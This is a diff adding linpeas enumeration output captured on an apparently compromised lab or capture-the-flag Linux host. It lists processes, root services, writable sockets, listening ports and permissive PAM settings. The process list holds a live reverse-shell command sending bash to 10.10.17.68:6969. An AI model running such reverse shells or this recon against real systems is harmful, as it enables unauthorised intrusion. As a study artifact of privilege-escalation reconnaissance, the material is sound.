@@ -1,0 +1,424 @@
+╔══════════╣ Running processes (cleaned) (T1057)
+╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes
+root           1  0.0  0.3  24116 14344 ?        Ss   09:32   0:07 /usr/lib/systemd/systemd --switched-root --system --deserialize=47
+root         600  0.2  3.1 206808 126444 ?       S<s  09:32   0:17 /usr/lib/systemd/systemd-journald
+systemd+     648  0.0  0.3  22976 13656 ?        Ss   09:32   0:00 /usr/lib/systemd/systemd-resolved
+  └─(Caps) 0x0000000000002500=cap_setpcap,cap_net_bind_service,cap_net_raw
+root         656  0.0  0.2  37520 11252 ?        Ss   09:32   0:00 /usr/lib/systemd/systemd-udevd
+root         756  0.4  0.1  24420  4668 ?        S<sl 09:32   0:35 /usr/sbin/auditd
+_laurel      759  0.3  0.3  19380 13180 ?        R<   09:32   0:24  _ /usr/local/sbin/laurel --config /etc/laurel/config.toml
+  └─(Caps) 0x0000000000080004=cap_dac_read_search,cap_sys_ptrace
+root         974  0.0  0.0   3040  1956 ?        Ss   09:32   0:00 /bin/sh /usr/lib/systemd/scripts/chronyd-starter.sh -n -F 1
+_chrony     1079  0.0  0.1  20272  5520 ?        S    09:32   0:00  _ /usr/sbin/chronyd -n -F 1
+  └─(Caps) 0x0000000002000400=cap_net_bind_service,cap_sys_time
+_chrony     1121  0.0  0.0  11944  2344 ?        S    09:32   0:00      _ /usr/sbin/chronyd -n -F 1
+  └─(Caps) 0x0000000002000400=cap_net_bind_service,cap_sys_time
+root         975  3.4  0.9 1144388 36316 ?       Ss   09:32   4:33 /usr/bin/python3 /root/staging/CorpoSite/app.py
+root         977  0.0  0.0   7256  3100 ?        Ss   09:32   0:00 /usr/sbin/cron -f -P
+message+     978  0.0  0.1   8764  5064 ?        Ss   09:32   0:01 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+  └─(Caps) 0x0000000020000000=cap_audit_write
+root         985  0.0  0.0   4172  3276 ?        Ss   09:32   0:00 dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
+archivi+     988  0.0  0.4  28040 17572 ?        Ss   09:32   0:00 /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log
+lp           990  0.0  0.3  94272 12608 ?        Ss   09:32   0:00 /usr/bin/python3 /opt/LPDServer/server.py
+root         994  0.0  0.6  41492 26952 ?        Ss   09:32   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
+root        1005  0.0  0.2  18340  8180 ?        Ss   09:32   0:00 /usr/lib/systemd/systemd-logind
+root        1007  0.0  0.2  20900 10684 ?        Ss   09:32   0:00 /usr/bin/VGAuthService
+root        1009  0.1  0.2 254796 11236 ?        Ssl  09:32   0:09 /usr/bin/vmtoolsd
+root        1495  0.0  0.4  28432 17944 ?        Ss   09:32   0:00 /usr/bin/python3 /usr/bin/paperwork-daemon[0m
+root        1508  0.0  0.0  14936  2636 ?        Ss   09:32   0:00 nginx: master process /usr/sbin/nginx -g daemon[0m on; master_process on;
+www-data    1509  0.4  0.1  17176  6156 ?        S    09:32   0:33  _ nginx: worker process
+www-data    1510  0.4  0.1  17172  6176 ?        S    09:32   0:34  _ nginx: worker process
+root        1511  0.0  0.0   8572  2664 tty1     Ss+  09:32   0:00 /sbin/agetty -o -- u --noreset --noclear - linux
+lp        155364  0.0  0.0   7680  3920 ?        S    10:55   0:00 /bin/bash -c bash -i >& /dev/tcp/10.10.17.68/6969 0>&1
+lp        155365  0.0  0.1   7944  4560 ?        S    10:55   0:00  _ bash -i
+lp        202332 10.0  0.1  10636  6968 ?        S    11:41   0:07      _ bash linpeas.sh
+lp        220754  0.0  0.1  10636  5008 ?        S    11:42   0:00          _ bash linpeas.sh
+lp        220757  0.0  0.1   9872  4488 ?        R    11:42   0:00          |   _ ps fauxwww
+lp        220758  0.0  0.1  10636  4856 ?        S    11:42   0:00          _ bash linpeas.sh
+lp        189997  0.0  0.0   7680  2048 ?        S    11:05   0:00 bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
+lp        189999  0.0  0.0   7680  1808 ?        S    11:05   0:00  _ bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
+lp        190001  0.0  0.0   7680  2336 ?        S    11:05   0:00  |   _ bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
+lp        190005  0.0  0.1 218608  7488 ?        Sl   11:05   0:00  |       _ dd bs=9000 count=1
+lp        190000  0.0  0.0   6864  2444 ?        S    11:05   0:00  _ grep accessible
+╔══════════╣ Services and Service Files (T1543.002,T1007)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services
+
+══╣ Active services: (T1543.002,T1007)
+apparmor.service                         loaded active exited  Load AppArmor profiles
+auditd.service                           loaded active running Security Audit Logging Service
+blk-availability.service                 loaded active exited  Availability of block devices
+chrony.service                           loaded active running chrony, an NTP client/server
+console-setup.service                    loaded active exited  Set console font and keymap
+corposite.service                        loaded active running CorpoSite Service
+  Potential issue in service: corposite.service
+  └─ RUNS_AS_ROOT: Service runs as root\n
+cron.service                             loaded active running Regular background program processing daemon
+dbus.service                             loaded active running D-Bus System Message Bus
+  Potential issue in service file: /usr/lib/systemd/system/dbus.service
+  └─ RELATIVE_PATH: Could be executing some relative path\n
+dracut-shutdown.service                  loaded active exited  Restore /run/initramfs on shutdown
+finalrd.service                          loaded active exited  Create final runtime dir for shutdown pivot root
+getty@tty1.service                       loaded active running Getty on tty1
+ifup@eth0.service                        loaded active exited  ifup for eth0
+  Potential issue in service file: /usr/lib/systemd/system/ifup@.service
+  └─ RELATIVE_PATH: Could be executing some relative path\n
+ifupdown-pre.service                     loaded active exited  Helper to synchronize boot up for ifupdown
+  Potential issue in service file: /usr/lib/systemd/system/ifupdown-pre.service
+  └─ RELATIVE_PATH: Could be executing some relative path\n
+jetdirect.service                        loaded active running jetdirect server
+keyboard-setup.service                   loaded active exited  Set the console keyboard layout
+kmod-static-nodes.service                loaded active exited  Create List of Static Device Nodes
+lpdserver.service                        loaded active running LPD server
+lvm2-monitor.service                     loaded active exited  Monitoring of LVM2 mirrors, snapshots etc. using dmeventd or progress polling
+networkd-dispatcher.service              loaded active running Dispatcher daemon for systemd-networkd
+networking.service                       loaded active exited  Raise network interfaces
+  Potential issue in service file: /usr/lib/systemd/system/networking.service
+  └─ RELATIVE_PATH: Could be executing some relative path\n
+nginx.service                            loaded active running A high performance web server and a reverse proxy server
+open-vm-tools.service                    loaded active running Service for virtual machines hosted on VMware
+paperwork.service                        loaded active running Paperwork Management Daemon
+  Potential issue in service: paperwork.service
+  └─ RUNS_AS_ROOT: Service runs as root\n
+plymouth-quit-wait.service               loaded active exited  Hold until boot process finishes up
+plymouth-quit.service                    loaded active exited  Terminate Plymouth Boot Screen
+plymouth-read-write.service              loaded active exited  Tell Plymouth To Write Out Runtime Data
+setvtrgb.service                         loaded active exited  Set console scheme
+ssh.service                              loaded active running OpenBSD Secure Shell server
+sysstat.service                          loaded active exited  Resets System Activity Logs
+  Potential issue in service file: /usr/lib/systemd/system/sysstat.service
+  └─ RELATIVE_PATH: Could be executing some relative path\n
+  Potential issue in service: sysstat.service
+  └─ RUNS_AS_ROOT: Service runs as root\n
+systemd-binfmt.service                   loaded active exited  Set Up Additional Binary Formats
+systemd-fsck-root.service                loaded active exited  File System Check on Root Device
+systemd-fsck@dev-sda2.service            loaded active exited  File System Check on /dev/sda2
+systemd-journal-flush.service            loaded active exited  Flush Journal to Persistent Storage
+  Potential issue in service file: /usr/lib/systemd/system/systemd-journal-flush.service
+  └─ RELATIVE_PATH: Could be executing some relative path\n
+systemd-journald.service                 loaded active running Journal Service
+systemd-logind.service                   loaded active running User Login Management
+systemd-modules-load.service             loaded active exited  Load Kernel Modules
+systemd-random-seed.service              loaded active exited  Load/Save OS Random Seed
+systemd-remount-fs.service               loaded active exited  Remount Root and Kernel File Systems
+  Potential issue in service: systemd-remount-fs.service
+  └─ UNSAFE_CMD: Uses potentially dangerous commands\n
+systemd-resolved.service                 loaded active running Network Name Resolution
+systemd-sysctl.service                   loaded active exited  Apply Kernel Variables
+systemd-tmpfiles-setup-dev-early.service loaded active exited  Create Static Device Nodes in /dev gracefully
+systemd-tmpfiles-setup-dev.service       loaded active exited  Create Static Device Nodes in /dev
+systemd-tmpfiles-setup.service           loaded active exited  Create System Files and Directories
+systemd-udev-load-credentials.service    loaded active exited  Load udev Rules from Credentials
+  Potential issue in service file: /usr/lib/systemd/system/systemd-udev-load-credentials.service
+  └─ RELATIVE_PATH: Could be executing some relative path\n
+systemd-udev-trigger.service             loaded active exited  Coldplug All udev Devices
+  Potential issue in service file: /usr/lib/systemd/system/systemd-udev-trigger.service
+  └─ RELATIVE_PATH: Could be executing some relative path\n
+  Potential issue in service: systemd-udev-trigger.service
+  └─ UNSAFE_CMD: Uses potentially dangerous commands\n
+systemd-udevd.service                    loaded active running Rule-based Manager for Device Events and Files
+systemd-user-sessions.service            loaded active exited  Permit User Sessions
+vgauth.service                           loaded active running Authentication service for virtual machines hosted on VMware
+wtmpdb-update-boot.service               loaded active exited  Write boot and shutdown times into wtmpdb
+Legend: LOAD   → Reflects whether the unit definition was properly loaded.
+ACTIVE → The high-level unit activation state, i.e. generalization of SUB.
+SUB    → The low-level unit activation state, values depend on unit type.
+49 loaded units listed.
+
+══╣ Disabled services: (T1543.002,T1007)
+chrony-wait.service                          disabled enabled
+console-getty.service                        disabled disabled
+debug-shell.service                          disabled disabled
+ifupdown-wait-online.service                 disabled enabled
+nftables.service                             disabled enabled
+rsync.service                                disabled enabled
+serial-getty@.service                        disabled enabled
+ssh.service                                  disabled enabled
+systemd-boot-check-no-failures.service       disabled disabled
+systemd-confext.service                      disabled enabled
+  Potential issue in service file: /usr/lib/systemd/system/systemd-confext.service
+  └─ RELATIVE_PATH: Could be executing some relative path\n
+systemd-network-generator.service            disabled enabled
+systemd-networkd-wait-online.service         disabled enabled
+systemd-networkd-wait-online@.service        disabled enabled
+systemd-pcrlock-file-system.service          disabled enabled
+systemd-pcrlock-firmware-code.service        disabled enabled
+systemd-pcrlock-firmware-config.service      disabled enabled
+systemd-pcrlock-machine-id.service           disabled enabled
+systemd-pcrlock-make-policy.service          disabled enabled
+systemd-pcrlock-secureboot-authority.service disabled enabled
+systemd-pcrlock-secureboot-policy.service    disabled enabled
+systemd-sysext.service                       disabled enabled
+  Potential issue in service file: /usr/lib/systemd/system/systemd-sysext.service
+  └─ RELATIVE_PATH: Could be executing some relative path\n
+systemd-udev-load-credentials.service        disabled enabled
+  Potential issue in service file: /usr/lib/systemd/system/systemd-udev-load-credentials.service
+  └─ RELATIVE_PATH: Could be executing some relative path\n
+upower.service                               disabled enabled
+23 unit files listed.
+╔══════════╣ Unix Sockets Analysis (T1571,T1049)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets
+/run/dbus/system_bus_socket
+  └─(Read Write (Weak Permissions: 666) )
+  └─(Owned by root)
+  └─High risk: root-owned and writable Unix socket
+/run/paperwork/mgmt.sock
+/run/ssh-unix-local/socket
+  └─(Read Write (Weak Permissions: 666) )
+  └─(Owned by root)
+  └─High risk: root-owned and writable Unix socket
+/run/systemd/inaccessible/sock
+/run/systemd/io.systemd.Credentials
+  └─(Read Write (Weak Permissions: 666) )
+  └─(Owned by root)
+  └─High risk: root-owned and writable Unix socket
+/run/systemd/io.systemd.Hostname
+  └─(Read Write (Weak Permissions: 666) )
+  └─(Owned by root)
+  └─High risk: root-owned and writable Unix socket
+/run/systemd/io.systemd.ManagedOOM
+  └─(Read Write (Weak Permissions: 666) )
+  └─(Owned by root)
+  └─High risk: root-owned and writable Unix socket
+/run/systemd/io.systemd.sysext
+/run/systemd/journal/dev-log
+  └─(Read Write (Weak Permissions: 666) )
+  └─(Owned by root)
+  └─High risk: root-owned and writable Unix socket
+/run/systemd/journal/io.systemd.journal
+/run/systemd/journal/socket
+  └─(Read Write (Weak Permissions: 666) )
+  └─(Owned by root)
+  └─High risk: root-owned and writable Unix socket
+/run/systemd/journal/stdout
+  └─(Read Write (Weak Permissions: 666) )
+  └─(Owned by root)
+  └─High risk: root-owned and writable Unix socket
+/run/systemd/notify
+  └─(Read Write Execute (Weak Permissions: 777) )
+  └─(Owned by root)
+  └─High risk: root-owned and writable Unix socket
+/run/systemd/private
+/run/systemd/resolve/io.systemd.Resolve
+  └─(Read Write (Weak Permissions: 666) )
+/run/systemd/resolve/io.systemd.Resolve.Monitor
+  └─(Read Write (Weak Permissions: 666) )
+/run/systemd/userdb/io.systemd.DynamicUser
+  └─(Read Write (Weak Permissions: 666) )
+  └─(Owned by root)
+  └─High risk: root-owned and writable Unix socket
+/run/udev/control
+/run/uuidd/request
+  └─(Read Write (Weak Permissions: 666) )
+  └─(Owned by root)
+  └─High risk: root-owned and writable Unix socket
+/run/vmware/guestServicePipe
+  └─(Read Write (Weak Permissions: 666) )
+  └─(Owned by root)
+  └─High risk: root-owned and writable Unix socket
+/var/run/vmware/guestServicePipe
+  └─(Read Write (Weak Permissions: 666) )
+  └─(Owned by root)
+  └─High risk: root-owned and writable Unix socket
+
+╔══════════╣ D-Bus Analysis (T1559.001)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus
+NAME                          PID PROCESS         USER            CONNECTION    UNIT                        SESSION DESCRIPTION
+:1.1                         1005 systemd-logind  root            :1.1          systemd-logind.service      -       -
+:1.1243                    237796 busctl          lp              :1.1243       lpdserver.service           -       -
+:1.2                          648 systemd-resolve systemd-resolve :1.2          systemd-resolved.service    -       -
+:1.3                            1 systemd         root            :1.3          init.scope                  -       -
+:1.5                          994 networkd-dispat root            :1.5          networkd-dispatcher.service -       -
+org.freedesktop.DBus            1 systemd         root            -             init.scope                  -       -
+org.freedesktop.PolicyKit1      - -               -               (activatable) -                           -       -
+org.freedesktop.UPower          - -               -               (activatable) -                           -       -
+org.freedesktop.hostname1       - -               -               (activatable) -                           -       -
+org.freedesktop.locale1         - -               -               (activatable) -                           -       -
+org.freedesktop.login1       1005 systemd-logind  root            :1.1          systemd-logind.service      -       -
+org.freedesktop.network1        - -               -               (activatable) -                           -       -
+org.freedesktop.resolve1      648 systemd-resolve systemd-resolve :1.2          systemd-resolved.service    -       -
+org.freedesktop.systemd1        1 systemd         root            :1.3          init.scope                  -       -
+org.freedesktop.thermald        - -               -               (activatable) -                           -       -
+org.freedesktop.timedate1       - -               -               (activatable) -                           -       -
+
+╔══════════╣ D-Bus Configuration Files (T1559.001)
+Activation definitions in /usr/lib/python3/dist-packages/uaclient/api/u/pro/services:
+Activation definitions in /usr/share/dbus-1/services:
+/usr/share/dbus-1/services/org.freedesktop.systemd1.service:11:Name=org.freedesktop.systemd1
+/usr/share/dbus-1/services/org.freedesktop.systemd1.service:12:Exec=Exec=/bin/false
+/usr/share/dbus-1/services/org.freedesktop.systemd1.service:13:User=User=root
+Activation definitions in /usr/share/dbus-1/system-services:
+/usr/share/dbus-1/system-services/org.freedesktop.resolve1.service:11:Name=org.freedesktop.resolve1
+/usr/share/dbus-1/system-services/org.freedesktop.resolve1.service:12:Exec=Exec=/bin/false
+/usr/share/dbus-1/system-services/org.freedesktop.resolve1.service:13:User=User=root
+/usr/share/dbus-1/system-services/org.freedesktop.locale1.service:11:Name=org.freedesktop.locale1
+/usr/share/dbus-1/system-services/org.freedesktop.locale1.service:12:Exec=Exec=/bin/false
+/usr/share/dbus-1/system-services/org.freedesktop.locale1.service:13:User=User=root
+/usr/share/dbus-1/system-services/org.freedesktop.PolicyKit1.service:2:Name=org.freedesktop.PolicyKit1
+/usr/share/dbus-1/system-services/org.freedesktop.PolicyKit1.service:3:Exec=Exec=/usr/lib/polkit-1/polkitd --no-debug
+/usr/share/dbus-1/system-services/org.freedesktop.PolicyKit1.service:4:User=User=root
+/usr/share/dbus-1/system-services/org.freedesktop.login1.service:11:Name=org.freedesktop.login1
+/usr/share/dbus-1/system-services/org.freedesktop.login1.service:12:Exec=Exec=/bin/false
+/usr/share/dbus-1/system-services/org.freedesktop.login1.service:13:User=User=root
+/usr/share/dbus-1/system-services/org.freedesktop.timedate1.service:11:Name=org.freedesktop.timedate1
+/usr/share/dbus-1/system-services/org.freedesktop.timedate1.service:12:Exec=Exec=/bin/false
+/usr/share/dbus-1/system-services/org.freedesktop.timedate1.service:13:User=User=root
+/usr/share/dbus-1/system-services/org.freedesktop.network1.service:11:Name=org.freedesktop.network1
+/usr/share/dbus-1/system-services/org.freedesktop.network1.service:12:Exec=Exec=/bin/false
+/usr/share/dbus-1/system-services/org.freedesktop.network1.service:13:User=User=root
+/usr/share/dbus-1/system-services/org.freedesktop.thermald.service:2:Name=org.freedesktop.thermald
+/usr/share/dbus-1/system-services/org.freedesktop.thermald.service:3:Exec=Exec=/bin/false
+/usr/share/dbus-1/system-services/org.freedesktop.thermald.service:4:User=User=root
+/usr/share/dbus-1/system-services/org.freedesktop.hostname1.service:9:Name=org.freedesktop.hostname1
+/usr/share/dbus-1/system-services/org.freedesktop.hostname1.service:10:Exec=Exec=/bin/false
+/usr/share/dbus-1/system-services/org.freedesktop.hostname1.service:11:User=User=root
+/usr/share/dbus-1/system-services/org.freedesktop.UPower.service:2:Name=org.freedesktop.UPower
+/usr/share/dbus-1/system-services/org.freedesktop.UPower.service:3:Exec=Exec=/usr/libexec/upowerd
+/usr/share/dbus-1/system-services/org.freedesktop.UPower.service:4:User=User=root
+/usr/share/dbus-1/system-services/org.freedesktop.systemd1.service:11:Name=org.freedesktop.systemd1
+/usr/share/dbus-1/system-services/org.freedesktop.systemd1.service:12:Exec=Exec=/bin/false
+/usr/share/dbus-1/system-services/org.freedesktop.systemd1.service:13:User=User=root
+
+══╣ D-Bus Session Bus Analysis (T1559.001)
+(Access to session bus available)
+
+
+╔══════════╣ Legacy r-commands (rsh/rlogin/rexec) and host-based trust (T1021.004)
+
+══╣ Listening r-services (TCP 512-514) (T1021.004)
+
+══╣ systemd units exposing r-services (T1021.004)
+rlogin|rsh|rexec units Not Found
+
+══╣ inetd/xinetd configuration for r-services (T1021.004)
+/etc/inetd.conf Not Found
+/etc/xinetd.d Not Found
+
+══╣ Installed r-service server packages (T1021.004)
+  No related packages found via dpkg
+
+══╣ /etc/hosts.equiv and /etc/shosts.equiv (T1021.004)
+
+══╣ Per-user .rhosts files (T1021.004)
+.rhosts Not Found
+
+══╣ PAM rhosts authentication (T1021.004)
+/etc/pam.d/rlogin|rsh Not Found
+
+══╣ SSH HostbasedAuthentication (T1021.004)
+  HostbasedAuthentication no or not set
+
+══╣ Potential DNS control indicators (local) (T1021.004)
+  Not detected
+
+╔══════════╣ Crontab UI (root) misconfiguration checks (T1053.003)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs
+crontab-ui Not Found
+╔══════════╣ Deleted files still open (T1083)
+╚ Open deleted files can hide tools and still consume disk space
+
+╔══════════╣ Deleted executables still running (T1083)
+╚ A deleted /proc/<PID>/exe may indicate tampering, cleanup, or a useful runtime-only binary
+╔══════════╣ Active Ports (T1049)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
+══╣ Active Ports (netstat) (T1049)
+tcp        0      0 0.0.0.0:1515            0.0.0.0:*               LISTEN      990/python3         
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:9100          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+══╣ Local-only listeners (loopback) (T1049)
+udp   UNCONN 0      0          127.0.0.1:323       0.0.0.0:*                                    
+tcp   LISTEN 0      100        127.0.0.1:9100      0.0.0.0:*                                    
+tcp   LISTEN 0      128        127.0.0.1:1337      0.0.0.0:*                                    
+══╣ Unique listener bind addresses (T1049)
+0.0.0.0
+127.0.0.1
+127.0.0.53%lo
+127.0.0.54
+::
+::1
+══╣ Potential local forwarders/relays (T1049)
+lp        238105  0.0  0.0   6988  2560 ?        S    11:44   0:00 sed -E s,socat|ssh|-L|-R|-D|ncat|nc,?[1;31;103m&?[0m,g
+
+╔══════════╣ Analyzing PAM Auth Files (limit 70)
+drwxr-xr-x 2 root root 4096 Jul  7 12:07 /etc/pam.d
+-rw-r--r-- 1 root root 2118 Sep 29  2025 /etc/pam.d/sshd
+account    required     pam_nologin.so
+session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
+session    required     pam_loginuid.so
+session    optional     pam_keyinit.so force revoke
+session    optional     pam_motd.so  motd=/run/motd.dynamic
+session    optional     pam_motd.so noupdate
+session    optional     pam_mail.so standard noenv # [1]
+session    required     pam_limits.so
+session    required     pam_env.so # [1]
+session    required     pam_env.so envfile=/etc/default/locale
+session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open
+
+drwxr-xr-x 2 root root 4096 Jul  7 12:07 /etc/pam.d
+-rw-r--r-- 1 root root 137 Jun 30  2025 /etc/pam.d/su-l
+-rw-r--r-- 1 root root 1208 Jul  7 11:59 /etc/pam.d/common-account
+account	required			pam_permit.so
+-rw-r--r-- 1 root root 520 Jul  3  2025 /etc/pam.d/other
+-rw-r--r-- 1 root root 1620 Jul  7 11:59 /etc/pam.d/common-password
+password	required			pam_permit.so
+-rw-r--r-- 1 root root 581 May  7  2025 /etc/pam.d/chsh
+auth		sufficient	pam_rootok.so
+-rw-r--r-- 1 root root 143 Jun 30  2025 /etc/pam.d/runuser
+auth		sufficient	pam_rootok.so
+-rw-r--r-- 1 root root 92 May  7  2025 /etc/pam.d/newusers
+-rw-r--r-- 1 root root 92 May  7  2025 /etc/pam.d/chpasswd
+-rw-r--r-- 1 root root 1435 Jul  7 11:59 /etc/pam.d/common-session-noninteractive
+session	[default=1]			pam_permit.so
+session	required			pam_permit.so
+-rw-r--r-- 1 root root 606 May 15  2025 /etc/pam.d/cron
+-rw-r--r-- 1 root root 2118 Sep 29  2025 /etc/pam.d/sshd
+-rw-r--r-- 1 root root 119 Sep 29  2025 /etc/pam.d/vmtoolsd
+-rw-r--r-- 1 root root 1509 Jul  7 11:59 /etc/pam.d/common-session
+session	[default=1]			pam_permit.so
+session	required			pam_permit.so
+-rw-r--r-- 1 root root 138 Jun 30  2025 /etc/pam.d/runuser-l
+-rw-r--r-- 1 root root 92 May  7  2025 /etc/pam.d/passwd
+-rw-r--r-- 1 root root 384 May  7  2025 /etc/pam.d/chfn
+auth		sufficient	pam_rootok.so
+-rw-r--r-- 1 root root 3974 Sep  6  2025 /etc/pam.d/login
+-rw-r--r-- 1 root root 1242 Jul  7 11:59 /etc/pam.d/common-auth
+auth	[success=1 default=ignore]	pam_unix.so nullok
+auth	required			pam_permit.so
+-rw-r--r-- 1 root root 2259 Jun 30  2025 /etc/pam.d/su
+auth       sufficient pam_rootok.so
+
+
+╔══════════╣ Analyzing Ldap Files (limit 70)
+The password hash is from the {SSHA} to 'structural'
+drwxr-xr-x 2 root root 4096 May 28 15:45 /etc/ldap
+
+
+╔══════════╣ Analyzing Keyring Files (limit 70)
+drwxr-xr-x 2 root root 4096 May 28 15:45 /etc/apt/keyrings
+drwxr-xr-x 2 root root 4096 May 28 15:45 /usr/share/keyrings
+
+
+
+
+╔══════════╣ Analyzing FastCGI Files (limit 70)
+-rw-r--r-- 1 root root 1055 Sep  8  2025 /etc/nginx/fastcgi_params
+
+╔══════════╣ Analyzing Postfix Files (limit 70)
+-rw-r--r-- 1 root root 2176 Jun  7  2024 /usr/share/X11/xkb/keycodes/aliases
+-rw-r--r-- 1 root root 12371 Jul  7 11:59 /usr/share/mime/aliases
+
+-rw-r--r-- 1 root root 676 Jan 26  2025 /usr/share/bash-completion/completions/postfix
+
+
+╔══════════╣ Analyzing Proxy Config Files (limit 70)
+-rw-r--r-- 1 root root 106 Oct  7  2025 /etc/environment
+
+
+
+╔══════════╣ Analyzing DNS Files (limit 70)
+-rw-r--r-- 1 root root 807 Jan 26  2025 /usr/share/bash-completion/completions/bind
+-rw-r--r-- 1 root root 807 Jan 26  2025 /usr/share/bash-completion/completions/bind
